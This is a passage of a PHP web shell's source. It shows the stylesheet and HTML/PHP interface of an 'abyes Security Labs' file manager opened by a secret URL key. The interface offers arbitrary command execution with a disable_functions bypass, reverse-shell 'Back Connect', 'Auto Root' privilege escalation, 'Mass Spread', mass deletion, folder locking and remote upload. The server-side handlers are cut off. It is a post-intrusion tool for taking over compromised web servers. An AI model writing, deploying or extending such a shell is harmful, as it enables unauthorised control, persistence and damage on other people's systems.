    border-bottom: 1px solid var(--border-soft);
    white-space: nowrap;
}

.file-table td {
    padding: 9px 16px;
    border-bottom: 1px solid rgba(255,255,255,0.03);
    font-size: 12.5px;
    transition: background 0.12s;
}

.file-table tbody tr:hover td { background: rgba(99,102,241,0.04); }
.file-table tbody tr:last-child td { border-bottom: none; }

.file-table td a { color: var(--text); text-decoration: none; transition: color 0.15s; }
.file-table td a:hover { color: var(--accent); }

.file-icon { display: inline-flex; align-items: center; gap: 9px; }
.folder-icon   { color: var(--gold); }
.file-icon-type { color: var(--accent); }

/* ─── Action Buttons (inline table) ─────────────────────── */
.action-btns { display: flex; gap: 4px; flex-wrap: wrap; }

.action-btns a {
    padding: 3px 9px;
    font-size: 10.5px;
    border-radius: var(--radius-sm);
    text-decoration: none;
    border: 1px solid var(--border-soft);
    color: var(--text-muted);
    transition: all 0.15s;
    font-family: 'Inter', sans-serif;
    background: rgba(255,255,255,0.03);
}
.action-btns a:hover { border-color: var(--border-hover); color: var(--text); background: rgba(99,102,241,0.08); }
.action-btns a.act-del { border-color: rgba(239,68,68,0.2); color: #ef6060; background: var(--red-muted); }
.action-btns a.act-del:hover { background: var(--red); color: white; border-color: var(--red); }

/* ─── Command / Terminal Section ─────────────────────────── */
.cmd-section {
    background: var(--bg-card);
    border: 1px solid var(--border-soft);
    border-radius: var(--radius);
    padding: 16px;
    margin-bottom: 14px;
    box-shadow: var(--shadow-sm);
}

.cmd-prompt {
    display: flex;
    align-items: center;
    gap: 8px;
    background: #050710;
    border: 1px solid var(--border);
    border-radius: var(--radius-sm);
    padding: 8px 12px;
}

.cmd-user   { color: var(--green); font-family: 'JetBrains Mono', monospace; font-size: 12px; font-weight: 600; }
.cmd-dollar { color: var(--accent); font-family: 'JetBrains Mono', monospace; }

.cmd-prompt input {
    flex: 1;
    background: transparent;
    border: none;
    color: var(--text);
    font-family: 'JetBrains Mono', monospace;
    font-size: 12px;
    outline: none;
    caret-color: var(--accent);
}

.cmd-output {
    background: #050710;
    border: 1px solid var(--border);
    border-radius: var(--radius-sm);
    padding: 14px;
    margin-top: 10px;
    max-height: 320px;
    overflow-y: auto;
}

.cmd-output pre {
    color: var(--green);
    font-size: 11.5px;
    white-space: pre-wrap;
    word-wrap: break-word;
    font-family: 'JetBrains Mono', monospace;
    margin: 0;
    line-height: 1.65;
}

/* ─── Forms ──────────────────────────────────────────────── */
.form-group  { margin-bottom: 14px; }
.form-label  {
    display: block;
    font-size: 11px;
    color: var(--text-muted);
    margin-bottom: 6px;
    font-weight: 500;
    letter-spacing: 0.2px;
}

.form-input {
    width: 100%;
    background: var(--bg-input);
    border: 1px solid var(--border);
    color: var(--text);
    padding: 9px 13px;
    border-radius: var(--radius-sm);
    font-family: 'Inter', sans-serif;
    font-size: 12.5px;
    outline: none;
    transition: border-color 0.18s, box-shadow 0.18s;
}
.form-input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(99,102,241,0.15); }
.form-input::placeholder { color: var(--text-subtle); }

.editor-area {
    width: 100%;
    min-height: 420px;
    background: #050710;
    border: 1px solid var(--border);
    color: #a6e3a1;
    padding: 16px;
    border-radius: var(--radius-sm);
    font-family: 'JetBrains Mono', monospace;
    font-size: 12px;
    outline: none;
    resize: vertical;
    line-height: 1.7;
    transition: border-color 0.18s;
}
.editor-area:focus { border-color: var(--accent); }

/* ─── Alerts ─────────────────────────────────────────────── */
.msg-success {
    background: rgba(34,197,94,0.08);
    border: 1px solid rgba(34,197,94,0.25);
    color: var(--green);
    padding: 10px 16px;
    border-radius: var(--radius-sm);
    font-size: 12.5px;
    margin-bottom: 14px;
    display: flex;
    align-items: center;
    gap: 8px;
}

.msg-error {
    background: rgba(239,68,68,0.08);
    border: 1px solid rgba(239,68,68,0.25);
    color: #f87171;
    padding: 10px 16px;
    border-radius: var(--radius-sm);
    font-size: 12.5px;
    margin-bottom: 14px;
    display: flex;
    align-items: center;
    gap: 8px;
}

/* ─── Modals ─────────────────────────────────────────────── */
.modal-overlay {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.75);
    backdrop-filter: blur(8px);
    -webkit-backdrop-filter: blur(8px);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 9999;
    padding: 16px;
}

.modal {
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: var(--radius-lg);
    max-width: 520px;
    width: 100%;
    box-shadow: var(--shadow-lg), 0 0 0 1px rgba(255,255,255,0.04) inset;
    animation: fadeIn 0.2s ease;
}

.modal-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 16px 20px;
    border-bottom: 1px solid var(--border-soft);
}

.modal-title {
    font-weight: 600;
    font-size: 14px;
    color: var(--text);
    display: flex;
    align-items: center;
    gap: 8px;
}

.modal-close {
    background: rgba(255,255,255,0.05);
    border: 1px solid var(--border-soft);
    color: var(--text-muted);
    cursor: pointer;
    width: 28px; height: 28px;
    border-radius: var(--radius-sm);
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.15s;
    font-size: 14px;
}
.modal-close:hover { background: var(--red-muted); color: var(--red); border-color: rgba(239,68,68,0.3); }

.modal-body   { padding: 20px; }
.modal-footer {
    padding: 14px 20px;
    border-top: 1px solid var(--border-soft);
    display: flex;
    justify-content: flex-end;
    gap: 8px;
}

/* ─── Misc ───────────────────────────────────────────────── */
.hidden { display: none !important; }

.uploader-row { display: flex; gap: 8px; align-items: center; margin-bottom: 8px; }

.custom-file-input {
    flex: 1;
    display: flex;
    align-items: center;
    gap: 10px;
    background: var(--bg-input);
    border: 1px solid var(--border);
    border-radius: var(--radius-sm);
    padding: 7px 12px;
    cursor: pointer;
    transition: all 0.18s;
}
.custom-file-input:hover { border-color: var(--border-hover); }
.custom-file-input input[type="file"] { display: none; }

.custom-file-input .file-btn {
    display: flex;
    align-items: center;
    gap: 6px;
    background: var(--accent);
    color: white;
    padding: 5px 12px;
    border-radius: 5px;
    font-size: 11px;
    font-weight: 600;
    white-space: nowrap;
    transition: background 0.15s;
}
.custom-file-input .file-btn:hover { background: #818cf8; }

.custom-file-input .file-name {
    font-size: 11px;
    color: var(--text-muted);
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    flex: 1;
}
.custom-file-input.has-file .file-name { color: var(--gold); }

/* ─── Footer ─────────────────────────────────────────────── */
.app-footer {
    border-top: 1px solid var(--border-soft);
    padding: 18px 24px;
    text-align: center;
    margin-top: 24px;
    background: rgba(8,11,20,0.7);
}
.footer-content  { display: flex; align-items: center; justify-content: center; gap: 12px; }
.footer-avatar   { width: 28px; height: 28px; border-radius: 50%; border: 2px solid var(--accent); box-shadow: 0 0 8px var(--accent-glow); }
.footer-text     { font-size: 11px; color: var(--text-muted); }
.footer-text span { color: var(--accent); font-weight: 600; }

/* ─── Mobile Action Dropdown ─────────────────────────────── */
.mob-action-wrap { position: relative; display: none; }
.mob-action-btn {
    background: rgba(255,255,255,0.05);
    border: 1px solid var(--border-soft);
    color: var(--text-muted);
    border-radius: var(--radius-sm);
    width: 30px; height: 28px;
    display: flex; align-items: center; justify-content: center;
    cursor: pointer;
    font-size: 15px; font-weight: 700; letter-spacing: 1px;
    transition: all 0.15s;
}
.mob-action-btn:hover,
.mob-action-btn.active { border-color: var(--border-hover); background: rgba(99,102,241,0.1); }

.mob-action-menu {
    display: none;
    position: fixed;
    z-index: 9999;
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: var(--radius);
    min-width: 170px;
    box-shadow: var(--shadow-lg);
    padding: 5px 0;
    flex-direction: column;
    animation: fadeIn 0.15s ease;
}
.mob-action-menu.open { display: flex; }

.mob-action-menu a {
    display: block;
    padding: 10px 16px;
    font-size: 12.5px;
    text-decoration: none;
    color: var(--text-muted);
    border: none;
    background: none;
    transition: background 0.12s;
    white-space: nowrap;
}
.mob-action-menu a:hover { background: rgba(99,102,241,0.08); color: var(--text); }
.mob-action-menu a.mob-del { color: var(--red); }
.mob-action-menu a.mob-del:hover { background: var(--red-muted); }
.mob-action-menu a.mob-lock { color: var(--gold); }

.mob-action-divider { height: 1px; background: var(--border-soft); margin: 4px 0; }

/* ─── Section Headers (card titles) ──────────────────────��� */
.section-title {
    font-size: 13px;
    font-weight: 600;
    color: var(--text);
    margin-bottom: 14px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.section-title::before {
    content: '';
    display: block;
    width: 3px; height: 16px;
    background: var(--accent);
    border-radius: 2px;
}

/* ─── Sort Links ─────────────────────────────────────────── */
.file-table th a {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    text-decoration: none;
    font-size: 10px;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 0.7px;
    color: var(--text-muted);
    white-space: nowrap;
    transition: color 0.15s;
}
.file-table th a:hover { color: var(--text); }

/* ─── Permission badge ───────────────────────────���───────── */
.perm-badge {
    font-family: 'JetBrains Mono', monospace;
    font-size: 10.5px;
    padding: 2px 7px;
    border-radius: 4px;
    border: 1px solid transparent;
}
.perm-rw   { color: var(--green);  border-color: rgba(34,197,94,0.25);  background: rgba(34,197,94,0.08); }
.perm-ro   { color: var(--text-muted); border-color: var(--border-soft); background: rgba(255,255,255,0.03); }
.perm-none { color: var(--red);    border-color: rgba(239,68,68,0.25);   background: var(--red-muted); }

/* ─── File size / date ───────────────────────────────────── */
.meta-text {
    font-size: 11.5px;
    color: var(--text-muted);
    font-family: 'JetBrains Mono', monospace;
}

/* ─── Responsive ─────────────────────────────────────────── */
@media (max-width: 768px) {
    body { font-size: 12px; }

    .app-header { padding: 0 14px; height: 52px; }
    .header-title { font-size: 13px; }
    .header-sub   { font-size: 9px; }
    .header-right { gap: 6px; }
    .sys-badge    { font-size: 9px; padding: 3px 8px; max-width: 120px; overflow: hidden; text-overflow: ellipsis; }

    .container { padding: 12px; }
    .breadcrumb { padding: 8px 12px; font-size: 11px; }
    .toolbar    { padding: 8px 10px; gap: 5px; }
    .toolbar .btn, .toolbar button { font-size: 10px; padding: 5px 9px; }

    .cmd-section { padding: 12px; }
    .cmd-prompt  { gap: 5px; flex-wrap: wrap; }
    .cmd-prompt input { min-width: 0; flex: 1; font-size: 11px; }
    .cmd-prompt .btn  { flex-shrink: 0; font-size: 10px; padding: 4px 8px; }

    /* Hide Type, Size, Permission, Last Modified on mobile — keep Name + Actions */
    .file-table th:nth-child(3), .file-table td:nth-child(3),
    .file-table th:nth-child(4), .file-table td:nth-child(4),
    .file-table th:nth-child(5), .file-table td:nth-child(5),
    .file-table th:nth-child(6), .file-table td:nth-child(6) { display: none; }

    .file-table th, .file-table td { padding: 8px; font-size: 12px; }
    .action-btns { display: none !important; }
    .mob-action-wrap { display: block; }

    /* Actions column is now 7th */
    .file-table th:nth-child(7), .file-table td:nth-child(7) { width: 38px; text-align: center; padding: 6px 4px; }
    .desk-actions-label { display: none; }
    .file-table td:nth-child(2) { max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }

    .modal { max-width: 95vw; }
    .modal-body { padding: 16px; }
    .modal-footer { padding: 12px 16px; gap: 6px; }
    .modal-header { padding: 12px 16px; }

    #terminalModal .modal {
        width: 100%; max-width: 100vw; height: 92vh;
        border-radius: var(--radius) var(--radius) 0 0;
        position: fixed; bottom: 0; left: 0; margin: 0;
    }
    #terminalModal.modal-overlay { align-items: flex-end; padding: 0; }

    #bulkBar { gap: 6px; padding: 8px 10px; }
    #bulkBar .btn { font-size: 9px !important; padding: 3px 7px !important; }

    .form-input  { font-size: 12px; padding: 8px 10px; }
    .editor-area { font-size: 11px; min-height: 300px; }
    .app-footer  { padding: 12px; }
    .footer-content { flex-direction: column; gap: 6px; }
}

@media (max-width: 480px) {
    .header-right { display: none; }
    .toolbar-label { display: none; }

    .file-table th:nth-child(3), .file-table td:nth-child(3),
    .file-table th:nth-child(4), .file-table td:nth-child(4),
    .file-table th:nth-child(5), .file-table td:nth-child(5),
    .file-table th:nth-child(6), .file-table td:nth-child(6) { display: none; }

    .file-table td:nth-child(2) { max-width: 160px; }
    .cmd-output { max-height: 200px; }
}
</style>
</head>
<body>

<?php if (isset($_GET['edit'])): ?>
<div class="container">
    <div style="margin-bottom: 12px;">
        <a href="?ecl=<?php echo urlencode(dirname($_GET['edit'])); ?>&_xk=labs" class="btn btn-secondary">&larr; Back</a>
    </div>
    <div class="cmd-section">
        <h3 style="color: var(--gold); margin-bottom: 12px;">Editing: <?php echo htmlspecialchars(basename($file)); ?></h3>
        <?php if (!empty($responseMessage)): ?><div class="msg-success"><?php echo $responseMessage; ?></div><?php endif; ?>
        <?php if (!empty($errorMessage)): ?><div class="msg-error"><?php echo $errorMessage; ?></div><?php endif; ?>
        <form method="POST">
            <textarea name="content" class="editor-area"><?php echo htmlspecialchars($content ?? ''); ?></textarea>
            <div style="margin-top: 10px; display: flex; gap: 8px;">
                <button type="submit" class="btn btn-primary">Save File</button>
                <a href="?ecl=<?php echo urlencode(dirname($file)); ?>&_xk=labs" class="btn btn-secondary">Cancel</a>
            </div>
        </form>
    </div>
</div>

<?php elseif (isset($_GET['rename'])): ?>
<div class="container">
    <div class="cmd-section">
        <h3 style="color: var(--gold); margin-bottom: 12px;">Rename: <?php echo htmlspecialchars(basename($_GET['rename'])); ?></h3>
        <form method="POST">
            <div class="form-group">
                <label class="form-label">New Name</label>
                <input type="text" name="new_name" class="form-input" value="<?php echo htmlspecialchars(basename($_GET['rename'])); ?>" required>
            </div>
            <div style="display: flex; gap: 8px;">
                <button type="submit" class="btn btn-primary">Rename</button>
                <a href="?ecl=<?php echo urlencode(dirname($_GET['rename'])); ?>&_xk=labs" class="btn btn-secondary">Cancel</a>
            </div>
        </form>
    </div>
</div>

<?php elseif (isset($_GET['chmod'])): ?>
<div class="container">
    <div class="cmd-section">
        <h3 style="color: var(--gold); margin-bottom: 12px;">Chmod: <?php echo htmlspecialchars(basename($_GET['chmod'])); ?></h3>
        <form method="POST">
            <div class="form-group">
                <label class="form-label">Permission</label>
                <input type="text" name="permission" class="form-input" placeholder="0755" maxlength="4" required>
            </div>
            <div style="display: flex; gap: 8px;">
                <button type="submit" class="btn btn-primary">Change</button>
                <a href="?ecl=<?php echo urlencode(dirname($_GET['chmod'])); ?>&_xk=labs" class="btn btn-secondary">Cancel</a>
            </div>
        </form>
    </div>
</div>

<?php else: ?>

<header class="app-header">
    <div class="header-left">
        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" style="color:var(--accent);flex-shrink:0;">
            <path d="M12 2L2 7l10 5 10-5-10-5z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
            <path d="M2 17l10 5 10-5" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
            <path d="M2 12l10 5 10-5" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
        </svg>
        <div class="header-brand">
            <div class="header-title">abyes Security Labs</div>
            <div class="header-sub">File Manager &mdash; <?php echo htmlspecialchars(php_uname('n')); ?></div>
        </div>
    </div>
    <div class="header-right">
        <div style="display:flex;align-items:center;gap:6px;">
            <div class="status-dot"></div>
            <span class="sys-badge" style="display:flex;align-items:center;gap:5px;">
                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
                <?php echo htmlspecialchars(php_uname('s') . ' ' . php_uname('m')); ?>
            </span>
        </div>
        <span class="sys-badge" style="display:flex;align-items:center;gap:5px;">
            <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
            <?php echo htmlspecialchars(@get_current_user()); ?>
        </span>
        <span class="sys-badge" style="display:flex;align-items:center;gap:5px;">
            <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
            PHP <?php echo PHP_MAJOR_VERSION . '.' . PHP_MINOR_VERSION; ?>
        </span>
        <form method="POST" style="display:inline;">
            <button type="submit" name="logout" class="btn btn-sm" style="border-color:rgba(239,68,68,0.3);color:#ef4444;background:rgba(239,68,68,0.08);" onmouseover="this.style.background='#ef4444';this.style.color='white'" onmouseout="this.style.background='rgba(239,68,68,0.08)';this.style.color='#ef4444'">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
                Logout
            </button>
        </form>
    </div>
</header>

<div class="container">
    <?php if (!empty($responseMessage)): ?><div class="msg-success"><?php echo $responseMessage; ?></div><?php endif; ?>
    <?php if (!empty($errorMessage)): ?><div class="msg-error"><?php echo $errorMessage; ?></div><?php endif; ?>

    <div class="breadcrumb" style="display:flex;align-items:center;gap:8px;">
        <a href="?ecl=<?php echo urlencode(dirname(__FILE__)); ?>&_xk=labs" title="Go to script location" style="display:inline-flex;align-items:center;justify-content:center;width:24px;height:24px;background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.3);border-radius:4px;color:#00d4ff;text-decoration:none;transition:all 0.2s;" onmouseover="this.style.background='rgba(0,212,255,0.2)'" onmouseout="this.style.background='rgba(0,212,255,0.1)'">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
        </a>
        <span><strong>DIR:</strong>&nbsp;<?php
        $bPath = str_replace('\\', '/', $currentDirectory);
        $parts = explode('/', $bPath);
        $pathParts = [];
        foreach ($parts as $id => $part) {
            if ($part == '' && $id == 0) {
                $pathParts[] = '<a href="?ecl=/&_xk=labs">/</a>';
            } elseif (!empty($part)) {
                $link = implode('/', array_slice($parts, 0, $id + 1));
                $pathParts[] = '<a href="?ecl=' . urlencode($link) . '&_xk=labs">' . htmlspecialchars($part) . '</a>';
            }
        }
        echo implode('/', $pathParts);
        ?></span>
    </div>

    <!-- Toolbar: Features -->
    <div class="toolbar">
        <div class="toolbar-label">Features</div>
        <button onclick="showCreateFolderModal()" class="btn btn-sm">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg>
            New Folder
        </button>
        <button onclick="showCreateFileModal()" class="btn btn-sm">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><line x1="9" y1="15" x2="15" y2="15"/></svg>
            New File
        </button>
        <form method="POST" style="display:contents;">
            <input type="submit" name="Summon" value="Adminer" class="btn btn-sm">
        </form>
        <form method="POST" enctype="multipart/form-data" style="display:contents;">
            <label class="upload-label">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                Upload
                <input type="file" name="file" onchange="this.form.submit()">
            </label>
            <input type="hidden" name="upload" value="1">
        </form>
        <button onclick="showModal('multiupload')" class="btn btn-sm">Multi Upload</button>
        <button onclick="showModal('remote')" class="btn btn-sm">Remote Upload</button>
    </div>

    <?php if (isset($_POST['upload']) && !empty($responseMessage)): ?>
    <div style="background:rgba(63,185,80,0.07);border:1px solid rgba(63,185,80,0.25);border-radius:8px;padding:14px;margin-bottom:10px;font-size:12px;line-height:1.7;">
        <?php echo $responseMessage; ?>
    </div>
    <?php endif; ?>

    <!-- Toolbar: Scanner -->
    <div class="toolbar">
        <div class="toolbar-label">Scanner</div>
        <form method="POST" style="display:contents;">
            <button type="submit" name="scan_deeply" class="btn btn-scan btn-sm">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                Deep Scan
            </button>
        </form>
        <form method="POST" style="display:contents;">
            <input type="hidden" name="scan_ext" value="php">
            <button type="submit" name="scan_newly" class="btn btn-scan btn-sm">New PHP Files</button>
        </form>
        <button onclick="showModal('chmod')" class="btn btn-chmod btn-sm">Mass Chmod</button>
        <button onclick="showModal('spread')" class="btn btn-spread btn-sm">Mass Spread</button>
        <button onclick="showLockManagerModal()" class="btn btn-sm" style="border-color:#f59e0b;color:#f59e0b;">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
            Lock Manager
        </button>
        <button onclick="showMassDeleteModal()" class="btn btn-sm" style="border-color: #f85149; color: #f85149;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
            Mass Delete
        </button>
    </div>

    <!-- Toolbar: Tools -->
    <div class="toolbar">
        <div class="toolbar-label">Tools</div>
        <button onclick="showModal('gsocket')" class="btn btn-gs btn-sm">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
            GSSocket
        </button>
        <button onclick="showModal('uapi')" class="btn btn-uapi btn-sm">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
            UAPI
        </button>
        <button onclick="showModal('ftp')" class="btn btn-ftp btn-sm">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
            FTP Manager
        </button>
        <?php if ($wpAvailable): ?>
        <button onclick="showModal('wp')" class="btn btn-wp btn-sm">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
            WordPress
        </button>
        <?php endif; ?>
        <button onclick="showModal('proc')" class="btn btn-proc btn-sm">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="4" width="16" height="16" rx="2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/><line x1="9" y1="15" x2="9.01" y2="15"/><line x1="15" y1="15" x2="15.01" y2="15"/></svg>
            Process
        </button>
        <button onclick="showModal('cron')" class="btn btn-cron btn-sm">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
            Cronjob
        </button>
        <button onclick="lockCurrentFolder()" class="btn btn-sm" style="border-color: #f59e0b; color: #f59e0b;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
            Lock Folder
        </button>
        <button onclick="showSymlinkModal()" class="btn btn-sm" style="border-color: #a78bfa; color: #a78bfa;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
            Symlink
        </button>
            <button onclick="showTerminalModal()" class="btn btn-sm" style="border-color:#58a6ff;color:#58a6ff;" title="Live Terminal">
                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:-2px;margin-right:4px"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Terminal
            </button>
            <button onclick="showBackconnectModal()" class="btn btn-sm" style="border-color: #ef4444; color: #ef4444;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
            Back Connect
        </button>
        <button onclick="showAutoRootModal()" class="btn btn-sm" style="border-color: #f59e0b; color: #f59e0b;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
            Auto Root
        </button>
        <button onclick="nowmeeToggle()" class="btn btn-sm" style="background:linear-gradient(135deg,rgba(99,102,241,0.15),rgba(34,211,238,0.08));border-color:rgba(99,102,241,0.4);color:#a5b4fc;font-weight:600;" title="Chat with Nowmee AI">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/><circle cx="9" cy="10" r="1" fill="currentColor"/><circle cx="12" cy="10" r="1" fill="currentColor"/><circle cx="15" cy="10" r="1" fill="currentColor"/></svg>
            Nowmee AI
        </button>
    </div>

    <!-- Command -->
    <div class="cmd-section">
        <form method="POST" id="cmdForm">
            <input type="hidden" name="use_bypass" id="useBypassField" value="0">
            <div class="cmd-prompt">
                <span class="cmd-user"><?php echo @get_current_user() . '@' . @gethostname(); ?></span>
                <span class="cmd-dollar" id="cmdModeLabel">$</span>
                <input type="text" name="cmd" placeholder="Enter command..." autofocus>
                <button type="submit" class="btn btn-sm btn-primary">Run</button>
                <button type="button" id="bypassToggle" class="btn btn-sm btn-secondary" onclick="toggleBypass()" title="Toggle Bypass Mode" style="padding: 4px 8px; font-size: 10px; min-width: 52px;">Normal</button>
            </div>
        </form>
        <?php
        $disabledFuncs = @ini_get('disable_functions');
        $execAvailable = !$disabledFuncs || (
            stripos($disabledFuncs, 'exec') === false &&
            stripos($disabledFuncs, 'shell_exec') === false &&
            stripos($disabledFuncs, 'proc_open') === false &&
            stripos($disabledFuncs, 'system') === false
        );
        ?>
        <div style="display: flex; gap: 8px; align-items: center; margin-top: 6px; padding: 0 8px;">
            <span style="font-size: 10px; color: var(--text-muted);">Exec:</span>
            <span style="font-size: 10px; color: <?php echo $execAvailable ? '#3fb950' : '#f85149'; ?>;"><?php echo $execAvailable ? 'Available' : 'Disabled'; ?></span>
            <span style="font-size: 10px; color: var(--text-muted);">|</span>
            <span style="font-size: 10px; color: var(--text-muted);">Bypass:</span>
            <span style="font-size: 10px; color: #00d4ff;">UAF PHP <?php echo PHP_MAJOR_VERSION . '.' . PHP_MINOR_VERSION; ?></span>
            <span style="font-size: 10px; color: var(--text-muted);">|</span>
            <span style="font-size: 10px; color: var(--text-muted);">Disabled:</span>
            <span style="font-size: 10px; color: #f97316; max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="<?php echo htmlspecialchars($disabledFuncs); ?>"><?php echo $disabledFuncs ? htmlspecialchars(substr($disabledFuncs, 0, 60)) . (strlen($disabledFuncs) > 60 ? '...' : '') : 'None'; ?></span>
        </div>
        <?php if (!empty($cmdOutput)): ?>
        <div class="cmd-output"><pre><?php echo htmlspecialchars($cmdOutput); ?></pre></div>
        <?php endif; ?>
    </div>

    <!-- Bulk Action Bar -->
    <div id="bulkBar" style="display:none; background: rgba(0,212,255,0.08); border: 1px solid rgba(0,212,255,0.25); border-radius: 8px; padding: 8px 14px; margin-bottom: 8px; display: none; align-items: center; gap: 10px; flex-wrap: wrap;">
        <span style="font-size: 11px; color: #00d4ff; font-weight: 600;"><span id="bulkCount">0</span> selected</span>
        <button class="btn btn-sm btn-primary" onclick="bulkAction('download')" style="font-size: 10px; padding: 3px 10px;">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:3px;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Download
        </button>
